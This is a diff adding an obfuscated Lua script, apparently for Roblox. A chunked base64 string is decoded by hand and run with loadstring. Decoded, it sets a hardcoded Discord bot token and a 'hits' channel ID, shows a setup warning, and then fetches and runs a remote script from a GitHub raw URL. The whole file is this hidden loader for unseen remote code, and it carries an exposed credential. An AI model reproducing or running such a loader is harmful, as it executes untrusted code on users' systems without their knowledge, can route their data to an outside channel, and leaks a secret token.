@@ -1,0 +1,32 @@
+local _64e19f50 = {}
+_64e19f50[1] = "X0cuRElTQ09SRF9UT0tFTiA9ICJNVEV6T0RFNU9USXlNamczTX"; _64e19f50[2] = "pjMk56azBOZyIKX0cuSElUU19DSEFOTkVMX0lEID0gIjE0MDYw"; _64e19f50[3] = "MTYwODE2NTQ3MTQ1OTMiCgppZiBub3QgX0cuSElUU19DSEFOTk"; _64e19f50[4] = "VMX0lEIG9yIF9HLkhJVFNfQ0hBTk5FTF9JRCA9PSAiWU9VUl9I"; _64e19f50[5] = "SVRTX0NIQU5ORUxfSURfSEVSRSIgdGhlbgogICAgbG9jYWwgQ2"; _64e19f50[6] = "9yZUd1aSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCiAg"; _64e19f50[7] = "ICBsb2NhbCBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aS"; _64e19f50[8] = "IpCiAgICBsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygiRnJh"; _64e19f50[9] = "bWUiKQogICAgbG9jYWwgdGl0bGUgPSBJbnN0YW5jZS5uZXcoIl"; _64e19f50[10] = "RleHRMYWJlbCIpCiAgICBsb2NhbCBtZXNzYWdlID0gSW5zdGFu"; _64e19f50[11] = "Y2UubmV3KCJUZXh0TGFiZWwiKQogICAgbG9jYWwgY2xvc2VCdG"; _64e19f50[12] = "4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgCiAg"; _64e19f50[13] = "ICBndWkuTmFtZSA9ICJDb25maWdXYXJuaW5nIgogICAgZ3VpLl"; _64e19f50[14] = "BhcmVudCA9IENvcmVHdWkKICAgIAogICAgZnJhbWUuUGFyZW50"; _64e19f50[15] = "ID0gZ3VpCiAgICBmcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ2"; _64e19f50[16] = "9sb3IzLmZyb21SR0IoNDAsIDQwLCA0MCkKICAgIGZyYW1lLlBv"; _64e19f50[17] = "c2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTIwMCwgMC41LCAtMT"; _64e19f50[18] = "AwKQogICAgZnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLCA0MDAs"; _64e19f50[19] = "IDAsIDIwMCkKICAgIGZyYW1lLkJvcmRlclNpemVQaXhlbCA9ID"; _64e19f50[20] = "IKICAgIGZyYW1lLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9t"; _64e19f50[21] = "UkdCKDI1NSwgMCwgMCkKICAgIAogICAgdGl0bGUuUGFyZW50ID"; _64e19f50[22] = "0gZnJhbWUKICAgIHRpdGxlLlRleHQgPSAi4pqg77iPIENPTkZJ"; _64e19f50[23] = "R1VSQVRJT04gUkVRVUlSRUQg4pqg77iPIgogICAgdGl0bGUuRm"; _64e19f50[24] = "9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zQm9sZAogICAgdGl0"; _64e19f50[25] = "bGUuVGV4dFNpemUgPSAxOAogICAgdGl0bGUuVGV4dENvbG9yMy"; _64e19f50[26] = "A9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTAwLCAxMDApCiAgICB0"; _64e19f50[27] = "aXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgdG"; _64e19f50[28] = "l0bGUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCA0MCkKICAg"; _64e19f50[29] = "IHRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsID"; _64e19f50[30] = "EwKQogICAgCiAgICBtZXNzYWdlLlBhcmVudCA9IGZyYW1lCiAg"; _64e19f50[31] = "ICBtZXNzYWdlLlRleHQgPSAiWW91IG5lZWQgdG8gc2V0IHlvdX"; _64e19f50[32] = "IgSElUU19DSEFOTkVMX0lEIGluIHRoZSBsb2FkZXIhXG5cbkZp"; _64e19f50[33] = "bmQgbGluZTogX0cuSElUU19DSEFOTkVMX0lEID0gXCJZT1VSX0"; _64e19f50[34] = "hJVFNfQ0hBTk5FTF9JRF9IRVJFXCJcblJlcGxhY2Ugd2l0aCB5"; _64e19f50[35] = "b3VyIERpc2NvcmQgY2hhbm5lbCBJRFxuXG5FeGFtcGxlOiBfRy"; _64e19f50[36] = "5ISVRTX0NIQU5ORUxfSUQgPSBcIjEyMzQ1Njc4OTAxMjM0NTY3"; _64e19f50[37] = "ODlcIiIKICAgIG1lc3NhZ2UuRm9udCA9IEVudW0uRm9udC5Tb3"; _64e19f50[38] = "VyY2VTYW5zCiAgICBtZXNzYWdlLlRleHRTaXplID0gMTQKICAg"; _64e19f50[39] = "IG1lc3NhZ2UuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMS"; _64e19f50[40] = "wgMSkKICAgIG1lc3NhZ2UuQmFja2dyb3VuZFRyYW5zcGFyZW5j"; _64e19f50[41] = "eSA9IDEKICAgIG1lc3NhZ2UuU2l6ZSA9IFVEaW0yLm5ldygxLC"; _64e19f50[42] = "AtMjAsIDAsIDEyMCkKICAgIG1lc3NhZ2UuUG9zaXRpb24gPSBV"; _64e19f50[43] = "RGltMi5uZXcoMCwgMTAsIDAsIDUwKQogICAgbWVzc2FnZS5UZX"; _64e19f50[44] = "h0V3JhcHBlZCA9IHRydWUKICAgIG1lc3NhZ2UuVGV4dFlBbGln"; _64e19f50[45] = "bm1lbnQgPSBFbnVtLlRleHRZQWxpZ25tZW50LlRvcAogICAgCi"; _64e19f50[46] = "AgICBjbG9zZUJ0bi5QYXJlbnQgPSBmcmFtZQogICAgY2xvc2VC"; _64e19f50[47] = "dG4uVGV4dCA9ICJDbG9zZSIKICAgIGNsb3NlQnRuLkZvbnQgPS"; _64e19f50[48] = "BFbnVtLkZvbnQuU291cmNlU2FucwogICAgY2xvc2VCdG4uVGV4"; _64e19f50[49] = "dFNpemUgPSAxNgogICAgY2xvc2VCdG4uQmFja2dyb3VuZENvbG"; _64e19f50[50] = "9yMyA9IENvbG9yMy5mcm9tUkdCKDEyMCwgNDAsIDQwKQogICAg"; _64e19f50[51] = "Y2xvc2VCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMS"; _64e19f50[52] = "wgMSkKICAgIGNsb3NlQnRuLlBvc2l0aW9uID0gVURpbTIubmV3"; _64e19f50[53] = "KDAuNSwgLTUwLCAxLCAtNDApCiAgICBjbG9zZUJ0bi5TaXplID"; _64e19f50[54] = "0gVURpbTIubmV3KDAsIDEwMCwgMCwgMzApCiAgICAKICAgIGNs"; _64e19f50[55] = "b3NlQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3"; _64e19f50[56] = "Rpb24oKQogICAgICAgIGd1aTpEZXN0cm95KCkKICAgIGVuZCkK"; _64e19f50[57] = "ICAgIAogICAgcmV0dXJuCmVuZAoKbG9jYWwgc2NyaXB0X3VybC"; _64e19f50[58] = "A9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v"; _64e19f50[59] = "RHVwZU5ldy9ib3QvcmVmcy9oZWFkcy9tYWluL3NpbXBsZV9hdX"; _64e19f50[60] = "Rvam9pbmVyIgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldChzY3Jp"; _64e19f50[61] = "cHRfdXJsKSkoKQ=="
+local _aae957a2 = ""
+for i = 1, #_64e19f50 do
+    _aae957a2 = _aae957a2 .. (_64e19f50[i] or "")
+end
+local _c976cf1d = ""
+local _1b95003b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+for i = 1, #_aae957a2, 4 do
+    local _f4cffe8d = _aae957a2:sub(i, i+3)
+    local _10977d65 = 0
+    for j = 1, #_f4cffe8d do
+        local _b4cbc923 = _1b95003b:find(_f4cffe8d:sub(j,j))
+        if _b4cbc923 then
+            _b4cbc923 = _b4cbc923 - 1
+            _10977d65 = _10977d65 + _b4cbc923 * (64 ^ (4-j))
+        end
+    end
+    for j = 1, 3 do
+        if i + j - 1 <= #_aae957a2 then
+            _c976cf1d = _c976cf1d .. string.char(math.floor(_10977d65 / (256 ^ (3-j))) % 256)
+        end
+    end
+end
+local _4d45968b = ""
+local _counter = 1
+while _counter <= #_c976cf1d do
+    local _byte = _c976cf1d:byte(_counter)
+    _4d45968b = _4d45968b .. string.char(_byte)
+    _counter = _counter + 1
+end
+loadstring(_4d45968b)()
